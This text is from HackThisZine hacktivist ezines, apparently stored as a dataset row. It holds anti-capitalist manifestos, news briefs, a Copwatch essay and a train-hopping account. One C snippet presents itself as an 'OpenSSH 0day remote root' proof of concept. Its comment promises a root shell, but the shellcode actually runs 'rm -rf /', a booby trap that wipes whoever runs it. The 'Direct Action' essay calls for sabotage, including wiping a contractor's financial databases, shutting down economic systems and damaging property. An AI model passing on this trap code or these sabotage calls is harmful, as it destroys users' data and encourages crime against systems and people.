which political party is cracking the whip. No amount of reform or institutional 
change through their political process can address the roots of the problem. No 
'newer, better, greener' technology can solve the problems technology itself has 
created. It is for this reason we must reverse the direction of the machine - 
from controlling and enslaving to freeing and liberating - and use technology to 
destroy it's master, the Industrial Beast.
   
The Role of the Hacker 

The role of the hacker is to exploit the system's internal contradictions and 
turn them against itself - to stop the Ruling Classes from using technology to 
control us, and instead return technology back to the people to fight for 
freedom, justice, and equality. We must crack, break, and subvert the Machine 
and reverse it's direction. 

The ruling classes know that whoever controls technology has power, which is why 
they try to limit access to computers and technology. It is not a secret that 
those who have access to technology and training are generally limited to the 
middle and upper classes, ensuring that only those who are comfortable with the 
status quo hold all the keys. They do not want the unwashed masses to have the 
same access to manipulate technology; rather, they seek to manipulate the 
unwashed masses _by_ technology. 

It is ironic that hackers, hacking an unusual amount of power over technology 
and possessing the ability to shut down the machine, generally belong to the 
privileged classes and may have little interest in changing the status quo and 
will likely be satisfied by being quietly filed into one of the many computer 
jobs available in the Establishment. This is not always the case, as hackers are 
often prodigies who live unconventional lives and whose values may reflect a 
deeper perspective on society.

As they grow older, aspiring hackers are forced to decide what they want to do 
with their skills and are generally pulled into three broad directions:

   (1) They sell out to Corporations security firms, or Government and try to
   make a buck by giving away all the secrets and tricks of the trade as a
   ""security consultant"". These ""white hats"", or ""sellouts"", whore their skills
   to the Establishment and help protect the infrastructure of the Industrial
   Beast, whether they consciously realize it or not.
   
   (2) Other hackers have different motivations. They are scammers, defrauders,
   graffiti artists, also trying to make money or a name for themselves, or are
   simply just hobbyist hackers. This is a broad group, but are generally
   apolitical and have no loyalties or ideologies and act as a rogue. Although
   they are popularly called ""black hat"" or ""grey hat"", they often share the
   same motivations as white hats (money and fame), but use different means to
   accomplish this.
   
   (3) The third category are Hacktivists who take a principled stand and use
   their skills not to benefit themselves but to support social justice
   struggles, fighting for freedom, equality, and social justice, and a return
   back to a state of harmony with the earth.
   
Generally speaking, whichever category one ends up in is mainly dependent on 
which socio-economic class you belong to or support. However, considering the 
planetary crisis we face caused by the Industrial Beast, lines are being drawn 
and it is becoming increasingly necessary to decide which side you are on.

It is the Duty of Hackers to use their skills and privilege to use technology 
against the Industrial Beast. It is up to us hackers to realize who the real 
enemy is - and to point our technological guns in the right direction.

Using Technology to Subvert the Industrial Beast

Because the ruling classes try to restrict access and training to technology to 
the privileged classes, simply making these resources available can be a 
revolutionary act. Community centers can be set up with free internet access to 
train people how to use computers, and also to build and repair computers from 
spare or discarded parts to be distributed free of charge.

In addition, our duty is to get everyone we know to stop supporting the Beast in 
any way. Don't make it easy for them to track you, or hold any kind of power 
over you. If all of us were able to completely refuse to participate in their 
Numbers Racket, they would be completely powerless. Remember, although they have 
tricked many people into thinking it is impossible to survive without them, we 
still hold all the real power because they depend on us for all their manual 
labor and work, so if we teach ourselves how to survive on our own and refuse to 
participate, they are doomed.

Some ways to Unplug and live Off the Grid:
   * refuse to use bank accounts, credit cards, checks, loans
   * refuse to pay taxes; work under the table if you can
   * refuse to drive a car, ride a bike instead
   * refuse to purchase goods from their stores or watch TV
   * learn to grow your own food, clean your own water, make and fix your own 
   clothes, and don't be afraid to live in the wild
   * _self-sufficiency is the answer_ 

Become self-sufficient so you can survive on your own without their 'help' cuts 
off all the power they have over you. We can build our own communities and live 
free on our own (i.e Temporary Autonomous Zone). But until everyone else is free 
and stops supporting the Machine, it will continue eating up everything in it's 
path ('manifest destiny'). So 'passive resistance' may not be enough to stop it.

Fortunately, it does not take much for a hacker to deal crippling blows against 
the Machinery of Capitalism. Everyone, especially hackers, knows there are 
weaknesses in every system, everything is fallible, and that the more complex a 
system is, the more places there are to stick the dynamite. These days, 
everything is interconnected through networks and databases. The Industrial 
Beast is not some faceless monolith; there are specific corporations, 
governments and individuals responsible for the world's wars and ecological 
disasters.

It is not hard to imagine some of the ways we can throw a monkey wrench into the 
machine. Some ideas:
   * Hijack radio, TV, and websites to broadcast messages encouraging a
   revolution, an end to capitalist wars, and shutting down prisons
   * Shut down economic systems, creating incidents to stir fear
   * Expose vulnerabilities in election systems to reveal their fraudulent
   nature, and to encourage Direct Action
   * Expose internal communications of corrupt institutions and state secrets
   * Shut 'em down!

From whichever angle you attack the Beast, it must also be in coordination with 
on-the-ground protests, marches, and educational campaigns so the media cannot 
twist it around and call us terrorists. The people must understand and agree 
with the cause.

In addition, alternatives to Industrialism must be made available, such as 
self-sufficient communes, worker collectives, etc - to function once the 
Industrial Beast collapses. These must be created through direct democracy, 
collective decision making, autonomy and non-hierarchical processes, embracing a 
gift-economy instead of a privatized competitive market, or else our new society 
may fall victim to the same mistakes as that of the Beast.
   
As the global crisis intensifies over the next few years, the major 
industrialized nations will soon be 'running on empty' and may resort to 
drastic, unpredictable actions to stay in power. It's no secret that the Titanic 
is sinking. The time to Abandon Ship is now.

    Run, Comrades, the Old World is Behind You!


################################################################################
# 9. Oscar Grant and Copwatch 2.0                                  by Flatline #
################################################################################

On January 1st 2009, Oscar Grant was murdered in cold blood by members of the 
bay area rapid transit police dept.  Oscar Grant is not the first person to be 
the victim of a police murder, and he will certainly not be the last.  But the 
case of Oscar Grant is unique, it is different than any other police murder yet 
and it heralds a new future.  The murder of Oscar grant is different because it 
was witnessed by millions of people.

Oscar Grant was shot in the back by johannes mehserle, but Grant was not alone, 
many people were around him and at least two of them had cell phone cameras and 
taped the whole thing, and then hours later, it was uploaded to you tube, for 
all the world to see. These people were (probably) inadvertently participating 
in copwatch.  Copwatch is the idea that to keep police honest and to keep the 
citizenry safe, people must follow the police, go where they go, and document 
what they do. Preferably with video evidence.  Now I am the first to say that 
terms like 'web 2.0' and 'social networks' are just marketing fluff; but after 
witnessing the aftermath of this particular police murder, I feel that You Tube, 
camera phones and social networks (basically summed up as the ability to create, 
publish and share media nearly instantly) can herald in a wonderful new era of 
transparency for law enforcement and a wonderful new age for copwatch.  

The main problem with Copwatch perviously (from my experience) was that the cops 
would always take your video camera or destroy the tape once they saw you 
recording them.  You Tube and cellphone networks alleviate this problem by 
allowing you to pretty much instantly send a copy of the video to at least one 
trusted friend if not more.  That friend can then instantly upload the video and 
spread it around far and wide.  Information dissemination on this wide a scale 
has never before been possible.  

I postulate that without the power of services like YouTube and video messaging, 
mehserly would have never been punished for the killing of Grant, protests and 
riots never would have happened because the information never would have spread 
so far and wide and people would not have been so enraged without witnessing 
this atrocity first hand.  The pressure from the riots, protests, first hand 
video and the sheer number of people that witnessed this act was what forced 
BART's hand into prosecuting Mehserle.  If not for that Oscar Grant would be 
just another statistic.

A new model of CopWatch is needed, one which utilizes the ability to instantly 
create and distribute media to its fullest potential.  These days video 
recording phones can be had for cheap, possibly even free, and you tube is 
obviously a free service.  One could even start a copwatch clearing house for 
people to upload all of there copwatch videos.  If we watch the cops all the 
time, and make them know that they are going to be held responsible for there 
actions in the eyes of the public, we may be able to prevent another police 
murder from happening ever again.

################################################################################

                            anti-(c)opyright 2009

you are encouraged to reuse, reword, and reprint everthing in this zine as you 
please. this includes: printing your own copies to distribute to friends and
family, copying and pasting bits of text in your own works, mirroring electronic
copies to websites and file sharing services, or anything else you can think of-

                !! without asking permission or apologizing !!

Electronic copies of the zine are available free online at the Hack Bloc website 
(www.hackbloc.org/zine/). There are two versions of the zine: a full color 
graphical PDF version wich is best for printing and also includes all sorts of 
extras, as well as a raw TXT version for a more readable and compatible format. 
Having the zine in your hands is still the best way to experience our zine. If 
you can't print your own (double sided 8.5x11) than you can order copies of this 
issue and most back issues from our friends at Microcosm Publishing 
(www.microcosmpublishing.com) who are based out of Bloomington, IN. We are 
always seeking translators to translate HackThisZine into other languages, if 
your interested in working with us to translate this issue please send us an 
E-mail to us at: Staff@HackBloc.org.

################################################################################

                    HACK THIS ZINE SUMMER 2009 HACK THE GIBSON
                  (aka the ""Why is this joke still funny"" issue)
    
                   zine staff                     hackbloc staff           
                   ----------                     --------------   
                   Flatline                       Evoltech         
                   Nomenumbra                     Doll             
                   Evoltech                       Sally            
                   Kuroishi                       Ringo            
                   alxCIAda                       Frenzy           
                   Impact                         HexBomber        
                   Sally                          alxCIAda         
                   Frenzy                         Impact 
                                              Flatline 

                   get involved!    staff@hackbloc.org
               
                   BAY AREA: http://www.hackbloc.org
                   OLYMPIA:  http://www.olyhackbloc.org
               
                   AND MANY MORE CLANDESTINE COLLECTIVES
                   COMING SOON TO A CITY NEAR YOU!
               
################################################################################

// AND NOW !! OPENSSH 0DAY REMOTE ROOT PROOF OF CONCEPT CODE !! KEEP PRIVATE !!

#include <unistd.h>

char code[] = ""\x6a\x0b\x58\x31\xf6\x56\x6a\x2f\x89\xe7\x56\x66\x68\x2d\x66""
              ""\x89\xe2\x56\x66\x68\x2d\x72\x89\xe1\x56\x68\x2f\x2f\x72\x6d""
              ""\x68\x2f\x62\x69\x6e\x89\xe3\x56\x57\x52\x51\x53\x89\xe1\x31""
              ""\xd2\xcd\x80"";            // setuid(0) /bin/sh I swear!    

int main(int argc, char **argv)

{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}"
Papers,HackThisZine (HTZ) #6 - Lets Smash Windows!,eZine,,2009-01-01,: N/A,"James C. Settle, founder and head of the FBI's National Computer Crime Squad, ha
s said: ""I don't think the stuff we are seeing is the stuff we need to be worrie
d about. What that acti vity we do see is indicative of, however, is that we hav
e a really big problem.   ... Something is cooking but no one really knows what.
"" The motto of the sigh    t machine reverberates out of Settle's rhetoric: ""If 
I can see it, it's alrea     dy dead."" At the same time, the opposite-what Settl
e calls ""the dark side""-        is out there, plan    ning and scheming. Nomadic
 power has created its ow        n nemesis-its       own image. This brings up t
he possibility that as a          tactic for         exposing the nature of noma
dic power, ECD is already           outda          ted without having ever been 
tried. N    o real ""illega                        l"" action needs to be taken. F
rom the po            int                        of view of traditional terroris
m, action that                                   can reveal the cruelty of nomad
ic power need only                               exist in hyperreality, that is,
 as activities that m                                       erely indicate a pos
sibility of electronic     Hack This Zine #6:                             disast
er. From this mom          Let's Smash Windows                    ent forward, s
trategies of                                             the hyperreal will have
 to be do                                         wngraded into the real, meanin
g the                                             technocratic class (those with
 the skill to mount a pow                          erful resistance) will have t
o act on behalf of liber                             ation from electronic contr
ol under the nomadic el        ite                      . The reason: They are n
ot going to have a cho      ice. Si         nce           the individuals in thi
s class are the agents    of vulnera        bility           within the realm of
 cyberspace, repressi on in this clas       s will be f        ormidable. Since 
""the dark side"" has no image, the poli      ce state will        have no problem
 inscribing it with its own paranoid pr     ojections, thus d      oubling the a
mounts of repression, and pushing the si    tuation into a McCart   hyist frenzy
. To be sure, each technocrat will be pai   d well to sell h/er sovereignty, but
 CAE finds it hard to believe that all will  live happily under the microscope o
f repression and accusation. There will always be a healthy contingent who will 
want to die free rather than live constrained and controlled in a golden prison.

################################################################################
                             .__             .__           .___                   
  ______ _____ _____    _____|  |__  __  _  _|__| ___    __| _/_____  _  _______
 /  ___//     \\__  \  /  ___/  |  \ \ \/ \/ /  |/   \  / __ |/   \ \/ \/ /  __/
 \___ \|  Y Y  \/ __ \_\___ \|   Y  \ \     /|  |  |  \/ /_/ (     )     /\__ \ 
/____  >__|_|  (____  /____  >___|  /  \/\_/ |__|__|  /\____ |\___/ \/\_//___  >
     \/      \/     \/     \/     \/                \/      \/               \/ 

                    HackThisZine Issue #6 - Lets Smash Windows!                
 ""To be truly radical is to make hope possible rather than despair convincing""
                   loose lips sink ships - snitches get stiches

################################################################################

                            anti-(c)opyright 2009

you are encouraged to reuse, reword, and reprint everthing in this zine as you 
please. this includes: printing your own copies to distribute to friends and
family, copying and pasting bits of text in your own works, mirroring electronic
copies to websites and file sharing services, or anything else you can think of!

                !! without asking permission or apologizing !!

################################################################################
 [0:0]   TABLE OF DISCONTENTS                                             [0:0]
################################################################################
 [0:0] Intro

 [1:0] Political Articles: Views and Opinionated Articles
   >>>> [1:1] On the Necessity of Direct Action (by Nomenumbra)
   >>>> [1:2] Hacking Freight Trains Part 2 (by Haifleisch)
   >>>> [1:3] Hack This Tree (by frenzy)
   >>>> [1:4] SF Community Colo Project (by ryan)
   >>>> [1:5] Callout for electronic action at the DNC & RNC (by hackbloc)
   >>>> [1:6] 39 Lashes a poem (by Ardeo)
   >>>> [1:7] Tapatio:  RNC 08 Comms Analysis (by CGB)

 [2:0] Hacking/Technology: Articles for Digital Resistance
   >>>> [2:1] Cryptographic Education for the Militant Activist pt1 (Nomenumbra)
   >>>> [2:2] Crabgrass: Non-Corporate Social Networking (by Flatline)
   >>>> [2:3] The PE File format and its Darkside Part 2 (by Nomenumbra)
   >>>> [2:4] Full Disk Encryption Attacks (by hackbloc)
   >>>> [2:5] All Your Facebook Are Belong to Us (by flatline)
   >>>> [2:6] Communications Systems and Technology (by Impact)
   >>>> [2:7] Anonymity with Wireless Networking (by Impact)

                               About This Zine

Here we are with issue six of HackThisZine, it has been a long time since we put
out the last issue and some of you may have thought that we were never going to
come out with this issue, and at points we didn't either, but after much delay 
I can assure you that HackThisZine is indeed not vaporware.

As for those who will hate on us for not having an issue out for over a year, I 
have the following to say to you, if you want it to come out more often then
help out! Send us an article, send us some art, volunteer to help lay out the
zine, volunteer to help translate the zine, volunteer to help print the zine. We
 have lives outside the zine and putting it out isn't easy, or cheap!

We have a really great zine for you this time, we have part 2 of Nomenumbra's
article about the PE file system, we have part too of the Train Hopping article
by Ms. Haifleisch (part one was by Evoltech). We have an article on the
scariness of facebook. We have an article about the Berkeley Tree Sit by our
newest collective member Frenzy who has been helping out a lot around Hackbloc
HQ, everyone give him a warm welcome! I think that this is out best issue yet
and it comes out in a very interesting time, comcast has been ordered to stop
its traffic shaping by the FCC, America is on the eve of electing a new
president, and possibly also on the eve of invading Iran. The RNC and DNC are
only a month away and may have already even happened by the time you read this,
and the government and corporations (does there really need to be an and there?)
are still invading your privacy in newer and more explicit ways. Action is more
important now than it ever has been. We should take pride in the fact that
comcast has been forced to respect net neutrality by the FCC and we should see
that as a significant and inspiring victory and keep taking action untill the
last entity trying to strangle our freedom has been toppled.

We hope that our sixth communique will help you in your struggle.

                                         --The HackBloc Collective

################################################################################
 Stagnant News                                                    News in Brief
################################################################################

MIT Hackers Censored, Harassed by Unconstitutional Court Rulings
--------------------------------------------------------------------------------
Aug 11, 2008: Three MIT hackers Zack Anderson, RJ Ryan, and Alessandra Chiesa 
were sued in federal court and questioned by an FBI agent regarding their
anticipated presentation at the DEFCON 16 conference detailing their research
into the Massachusetts Bay Transit Authority (MBTA) transit cards. Federal Judge
 Douglas P. Woodlock held a special weekend session to grant an injunction
illegally preventing the three from speaking or releasing any details on their
research (despite the fact that their slideshow presentation was already on the
net and the DEFCON CDs being distributed to conference attendees). The students
attempted to notify the MBTA ahead of time to inform them of their
vulnerabilities, but it was likely advertising ""free subway rides for life"" at a
 conference full of federal agents and white hat corporate sellouts which
prompted the legal harassment. The EFF is representing the students.

Telecommunication Companies granted Retroactive Immunity for Illegal NSA Wiretap
--------------------------------------------------------------------------------
July 9, 2008: Congress passed the FISA Amendment Acts, which in addition to
giving law enforcement broader powers in their warrantless surveillance programs
 also gives Retroactive Immunity to companies who have secretly cooperated with
the NSA in setting up wire taps to monitor the communications of U.S. citizens.
In particular, this bill is intended to drop all the lawsuits that have been
filed against corporations (such as Hepting v. AT&T) for their illegal
surveillance and turning over of private information to the Feds.

Making the immunity ‘retroactive' is essentially admitting guilt that they've
been breaking the law with their unconstitutional monitoring program, and are
now just trying to cover their asses and prevent any sort of open discussion in
court. What is most disturbing about this is not that the President authorized
this secret NSA wiretap program before 9/11 happened, but that the Democrats
have rolled over and approved every single bill the Republicans have been trying
to push, even though they have the majority in Congress.

http://www.eff.org/issues/nsa-spying

Internet Archive Successfully Challenges FBI Subpoena
--------------------------------------------------------------------------------
May 7, 2008: The FBI was forced to withdraw a National Security Letter against
the Internet Archive (archive.org) after site founder Brewster Kahle, the EFF
and the ACLU filed a lawsuit challenging the subpoena. The NSL called for a
particular user's private information including name, address, length of service
email header information, and activity logs and also agged the site founder from
discussing the subpoena because it was ""relevant to an ongoing, authorized
national security investigation"", FBI Asst. Director John Miller commenting on
the case. Site founder Kahle stated, ""We see this as an unqualified success ...
the goal here was to help other receipients of NSLs ... understand that you can
push back on these.""

http://www.eff.org/press/archives/2008/05/06

Homeland Security Chief Defends Seizing Laptops at Airports Without a Warrant
--------------------------------------------------------------------------------
August 6, 2008: In a Wired.com interview, DHS Chief Michael Chertoff states he
is ""concerned about denial-of-service attacks"", but apparently is not concerned
about unconstitutional seizures of laptops at airports. If someone is ""entering
the country with an encrypted laptop ... and that individual refuses to
cooperate by providing a password ... then the laptop could be seized and
de-encrypted."" The interview is revealing of DHS priorities and strategies in
dealing with cybersecurity. In related news, National Cyber Security Center
director Rod Beckstrom spoke at DEFCON 16 calling computer hackers""one of the
greatest threats we face today in cyberspace"", making a comparison to Benedict
Arnold, famous traitor during the American Revolution'.

http://blog.wired.com/27bstroke6/2008/08/chertoff.html

EFF Launches ""Coders' Rights Project""
--------------------------------------------------------------------------------
The Electronic Frontier Foundation announced the Coders' Rights Project at the
2008 Blackhat convention. It's stated goal is to work to ""protect researchers
through education, legal defense, amicus briefs, and involvement in the
community ... protecting innovation and safeguarding the rights of curious
tinkerers and hackers on the digital frontier"". Currently on the project's
website are several papers analyzing the legal aspects of vulnerability research
as well as active cases the EFF is working on.
http://www.eff.org/issues/coders

RiseUp.net Announces ""Freedom Summer of Code""
--------------------------------------------------------------------------------
RiseUp.net is calling for proposals for new tech-activist projects as well as
soliciting programmers to help with development.

""Do you want to be compensated for inspiring and meaningful work this summer /
winter? Well, Riseup's Freedom Summer of Code has an amazing list of great ideas
 for you to choose from to work on! If you apply to work on one of the submitted
FSoC project proposals, you could be selected to receive funding for your work
on the project. Take a look and submit your application soon. We will be working
with various radical social justice organizations to determine the best fit and
will announce the winners as soon as that has completed.

To apply to work on a project, first be sure to join the mailing list
https://lists.riseup.net/www/info/fsoc-talk so you can get the latest updates
on the project. Secondly, to apply to work on a proposed project
(https://we.riseup.net/fsoc+proposals), visit the fsoc-coders pages
(https://we.riseup.net/fsoc+coders) and follow the directions there.""

################################################################################
 On the Necessity of Direct Action                    by Nomenumbra / [0x00SEC]
################################################################################

We have taller buildings but shorter tempers, wider freeways, but narrower
viewpoints, We buy more, but en- joy less. We have bigger houses, but a smaller
circle of friends. We have more degrees, but less commonsense. More knowledge
but less fair judgement, more experts yet more problems. We've added years to
our lives, without living them, We've done larger yet more meaningless things.
We claim to live in a free world and are assured constantly the world is kept
safe. Yet we are supposed to trade that same freedom for this ""security,"" We
have more strategic alliances, yet less friends. We multiplied our possessions
but reduced our values. We learned how to make a living, but forgot how to make
a life, We paved paradise, and put up a parking lot. We hunted entire species
into near extinction, only to keep the last few in a zoo. We don't make friends,
we cul- tivate ""business relations""; Nobel ideals have made place for what is
called common sense, and realism, yet we are still prepared to believe in lies
bigger than the naivety of any ideal, all for the sake of maintaining the status
quo. Cruelty and injustice, intolerance and oppression, do you truly not care or
are you afraid to care? Because, if you don't care about the misery inflicted
upon this world for the gain of the few, aren't you exactly the same kind of
monster you believe the people you hold your prejudices against to be? If you do
 however, why don't you show some care? Are you afraid of the social reaction?
Or are you afraid to see the truth? For the truth is that the extortionists, the
oppressors, the rulers who oppress the masses and squeeze the life out of them
where elected in most cases, or at least accepted. Who elected them? Who
tolerated their rule? Who chose their modern-day Nero or Caligula?

If you're looking for the guilty, you need only look into a mirror, I know why
you did it. I know you were afraid. War, terror, disease, fanaticism, It
corrupted your common sense, your free will. You chose ignorance over truth. You
chose conformism over expression. You chose security over freedom. You were
promised order. You were promised peace. You were promised progress. And all
that was demanded in return was your silent, obedient consent. And they couldn't
be wrong, now could they? After all, they got ""democratically"" elected. They
stood for progress and peace, your great leaders, your politicians, your
priests, your captains of industry, your gods.

Then why do so many suffer I ask you. Why do so many of these leaders indulge in
blatant over consumerism, while the majority of the world's population barely
has enough food to make it through the day. Why did your gods betray you and the
ideals you believed they stood for? Did it make you, the common man in the
""first world"", happier? From the beginning, when man struggled with nature, not
knowing where he might sleep, what he would eat, whether he would survive to see
the light of dawn again, there have always been those who would lord over
others. The People that believe that by some unseen right they are granted power
over oth- ers, and would push others down so that they might climb, are the
greatest threat to mankind's existence. For many years has one man or one race
prospered on the sweat and work of others. With every new leader you hoped for a
better world, a new tomorrow, a golden dawn, you big chance in the play that is
human history. You traded your Pharaohs for Caesars, your Emperors for party
leaders, your kings for captains of industry, hoping for that small glimmer of
freedom, a chance to escape the cycle. But you neglected, you didn't bother, you
assumed that another leader, a replacement would succeed where the former tyrant
had failed. Instead of waking up and realizing that the suppressing nature of
authority, the substitution of autonomy and sovereignty with conformism is what
truly kept you down, you allowed yourself to be cuddled asleep by the soothing
words of the tyrants, after all, this was the best solution no? All other
solutions where just idealism and non-realism, no? For obviously, you must have
everything your heart desires, for what else would one desire but expensive
cars, big houses and fame? That is what you aim for, no?

Let me ask you a question. Do you enjoy your life? Did you wake up today and
wish for tomorrow, a better day where you will appreciated? You don't live, you
just scratch on day to day work, Commute, Sleep, Work, Commute, Sleep, A
seemingly endless, forced cycle of social conformism. All we're waiting for is
something worth waiting for. You learn what you already know, become what you
already are. You waste waste the best 40 years of you life, to afford the last
20 of them, wasting away in some god-forsaken home for the elderly, forgotten by
the society you helped create, ignored by the leaders you brought to power and
neglected by the children you spawned. After all, they are just like you, and
are too busy being self-made people, reaching for the top to care for someone
who's economic usefulness is virtually absent, save for being a consumer,
we're mindless ants, consumers, by products of a commodity fetish. Poverty, war,
injustice, Profit-driven wars, freedom of expression is not what concerns us,
what concerns us are fancy human-interest magazines, television with over 400
channels, luxury cars, cheap and fast takeaway meals, a huge fucking house,
electrically-operated sexual devices, Rolex, KFC, Mercedes, Nike, MTV, Chrysler,
McDonalds', G-star, Dell, Geox, Toyota now THAT concerns us. Love, success,
happiness, art, knowledge and even charities have all become a branded,
force-fed product, bought for no other reason than the inability of the masses
to cope with media-induced consumerist intoxication. 

What else is there to life but this? Nothing, after all, it's all on television,
all right there, look in awe, listen, forget today's misery, kneel, pray for
salvation and hope that one day you will be among the stars and role-models fed
to you trough mass-media, that one day you will be adored, only to mindlessly
indulge in consumerism for no other reason than to radiate an image of social
acceptance. You claim to be comfortable and happy with your rabid consumerism
yet why do you suffer from burn-out and a condition near to existential despair?
For what purpose do you live? To become wealthy or famous? You think you ever
will be? And what if you succeed? Tell me why nowadays people know the price of
everything and the value of nothing.

Every image you watch on that television, every sitcom, every news bulletin is
another second off your life, never to return,wasted in a state of mindless
apathy towards your mortality. Do you know how long you live? Do you realize
that any moment it could end as abruptly and senselessly as it begun, just like
that? Don't you have other things to do? Is your life so fucking empty and
meaningless that you honestly can't think of a better way to spend these moments
than to waste away in solitude and consumerism? Or are you so intoxicated by
social conformism that you adhere to a set of standards ,installed by a social
class you don't belong to, to make you indulge in mindless consumerism for the 
benefit of the elite? Are you so afraid of stigma and social rejec- tion that
you simply ignore the choice to break this cycle? Is the only reason you're
still alive because someone decided to let you stay alive, because you still
have ""a job to do"" or yet ""have to make it"" in life? Is the only reason you
continue from day to day because you're waiting for ""your moment"". Your fucking
15 minutes of fame, your moment of immortal glory. Don't you realize that your
dreams of riches and fame are soap-bells created by the elite to keep you down?
Your American Dream is exactly what it says, a dream. Tell your what, you WON'T
be a popstar, you WON'T be a famous writer, you WON'T be a leading CEO. You'll
probably end up in a fucking small gray cubicle, processing information that is
none of your concern for a fee just enough to stay alive and rent your small
apartment. You'll owe people so much money you aren't broke, but broken. You
won't even be able to afford to pay attention.You'll work on day-to-day, waiting
for that tiny promotion, and when the chance occurs, you'll have to push others
down to climb.You'll have nothing sensible to say, but hey, you can say it in
five fucking languages and are certified to do so as well.Not because you're
incompetent or stupid, but simply because you're waiting for your promotion,
your ""chance in life"", instead of looking for an alternative to this apathetic
cycle. And after years of waiting, you realize that all you've done, all you've
been, all you've ever wanted to be was a tool, a simple instrument to generate
more profit for the select group of elite, the bourgeois who control the means
of production and squeeze you for every last penny, the group you're dying to
belong to, but will never be part of. The agony caused by this subconscious
knowledge leads to a lot of frustration in this world, to apathy towards true
suffering, like that of the hungry or that of those under repression or in the
middle of a war that is none of their concern.All your life dreams that have
been fed trough television and marketing are just created to keep you subdued as
an underling.Let's stop praying for someone to save us and start saving
ourselves.Let's stop this and start over.You are more than the sum of what you
consume. 

               YOU ARE NOT YOUR JOB
      YOU ARE NOT YOUR FUCKING BIG TELEVISION
YOU ARE NOT THAT WASHING MACHINE OR YOUR HUGE CAR

Break the cycle, don't go for the career of mindless drudgery, express yourself,
reprint, reword, and reuse copyrighted material, shut down major intersections
in the business district, deface billboards, storm execu- tive offices, social
engineer some food and give it out to people on the street, crash political
party conventions, throw paintbombs around in the business district, set up
traps in animal testing labs, cause mayhem at politi- cal congresses,occupy bank
buildings, circulate large amounts of fake cash at McDonalds, spray paint SUVs,
sabotage major economic conferences, dump large amounts of unprocessed oil near
shell executive buildings, Slit tires of cars of major executives, go on an
adbusting spree and give the city back to the citizens, remove corporate
multinational intoxication from everyday life, get hired as a waiter at major
multinational CEO and financial congresses and take the food to the streets and
distribute it among the poor, get hired as a phone call connector in a major
bank and connect every call to the wrong person, get hired as a network
administrator for a major arms contractor, sniff their traffic, make sensitive,
incriminating information public and wipe their financial databases afterwards.
By actions which compel general attention, the notion that they are not
powerless seeps into people's minds and gives them the opportunity to reclaim
their freedom. One such act may, in a few days, wake up more people than
thousands of pamphlets. Think you can't make a difference? Think again. You cook
their meals, haul their trash, write their software, connect their calls, drive
their ambulances, wash their cars, pump their gas, teach their kids operate
their networks and guard them wile they sleep. 

They DEPEND upon you more than both you and they know, more than they WANT you
to know. Once you realize this, your potential, the fact that you don't NEED
those leeches on top, those tyrants, you can work towards freedom, TRUE freedom,
not the bogus freedom- promised by so many. If you don't claim your life to the
fullest you will become a statistic. Do you realize that your life is a precious
gift, given only once like this, that you are spending most of it doing things
that are none of your business? If you where to die tomorrow, what are you going
to do today?Why aren't you doing it already? Afraid you don't fit in? Afraid of
the reaction? 

################################################################################
 Hacking Freight Trains part 2  by Haifleisch
################################################################################

Around sunset we headed out to the Oakland train yard and wandered down past the
bend to where the overpass comes down to meet the ground. Evoltech insisted we
sit down against a pillar and rest because our bags were dragging us down. We
didn't see a train for hours so eventually we pulled out our blanket and fell
asleep.

I jolted awake to him jumping up and pulling the blanket off of me a train...
flatcars. Not our first choice, actually the one I specifically didn't want to
take; too exposed and nowhere to sleep, but, when a decent looking 48 came into
sight, we grabbed our packs and ran for it. Delirious from being awakened from a
deep sleep, I ran along side the car and grabbed the handles on either side of
the ladder, and then looked down. The first ladder step was high, requiring a
leap. It was hard to navigate while the train was moving. I could see myself
missing the step, my lower body swinging under where the wheel was ready to take
off my foot. I panicked and let go.

""I couldn't do it"", I said, my heart racing. I was ready to try again, but there
were no more rideable cars. The train passed and we went back to our spot
feeling like we might have a chance of catching out that night. That was our
first train in the right direction and it was 2 in the morning. A few minutes
later an auto consist passed, but there's nowhere to ride an auto consist. We
sat back down and fell immediately back to sleep, but lighter. An hour later we
woke up to the scanner chirping, ""HERE WE GO!""

When another train came along Evoltech called it in on the UP tracking number.
It was our hot shot to Ill. He ran to catch the train, and stepped up onto the
tracks at the same time I spotted a train coming the opposite direction towards
us. They are amazingly quiet until they are right on top of you. I grabbed him
right before he stepped out in front of it. We waited anxiously for it to pass,
watching our train creep along on the other side. Thankfully the other train was
a short one and once it passed we ran for ours. This train was moving very
slowly,making it easy to catch. We waited for an inter-modal car with a decent
sized platform that was blocked from the wind. Once we found the car we wanted
we realized the train was stopping, then we noticed the headlights of a yard
workers 4 wheeler. Luckily, right in front of our car was a pillar with a bush
on the other side which gave us perfect cover. We inched around, hiding from the
4 wheeler as it drove past. 

The train sat for a long time. We sat between the bush and the pillar eating
dried mangoes and watching peeper frogs. Evoltech had found a inter-modal 48
that had a solid drop in the bottom so we could lie down, avoid being seen, and
not have to hold on for dear life.

Around sunrise we started to wonder if our train was ever going to leave. Then
we heard the brakes release. The sound of the trains are far less distinct then
the books [1] we read suggested. Evoltech shot me a mischievous grin and we
hopped on. We waited for the train to clear the Am-track station, and then made
ourselves a cozy bed and curled up and fell fast asleep.

We woke up around noon and spent a few miserable hours pressed into a half foot
of shade on one wall of the train car, trying to escape the blazing afternoon
sun, while the train picked up more cars in Sacramento. Later that day we rode
through Donner Pass. Evoltech and I stood at the edge of the car wishing that we
could jump in the water of the river below. I was so thirsty and knew our water
would be gone soon. I remembered hearing they were hard on hobos in Reno, NV,
and knew that it might be our next stop and only chance to get water for a
while. While riding a locomotive the noise is deafening. It surrounds you,
vibrating through your body. The train feels like some giant ancient beast that
the railroads have managed to tentatively wrangle.

Sleeping at night was not easy. We layered up early but it was not enough. Every
part of our bodies that touched the train was chilled and wouldn't warm up. The 
previous tenant of the car had left a plastic tomato box which we used to pee
in. Last night that box made its way around the car squeezing in between us and
once nestling by my head. Coming through the mountains that night every inch of
the sky was lit by stars.

Somewhere in the middle of the night I woke up to the cars crashing together
violently and then felt the train moving as if it had no breaks. I wondered if
we were in a humping yard. In a humping yard trains are taken apart and
reconnected, guided down sloping tracks, joining the car in front of them by
slamming the connectors of the two cars together. It isn't a safe place to be on
a car to say the least. Fortunately we weren't a hump yard and the yard workers
were just breaking off a few cars.

Somehow we slept through Reno and woke around sunrise, when the train stopped in
Elko. With only a half liter of water left, we threw our packs over and started
looking for a spigot. We found one in front of a Swan's Ice Cream office. We
filled our water bottles and ran back to the train, but we were too late and it
pulled out seconds before we reached it.

We decided to walk to a store and get a few gallon jugs of water. The first
place we came across was a trailer park / casino with a store. We bought water
and asked the counter woman questions about Elko She and the older man were very
friendly. She even offered us a complementary breakfast that was for guests
only. It was our first time off the train and we had been rolling in soot and
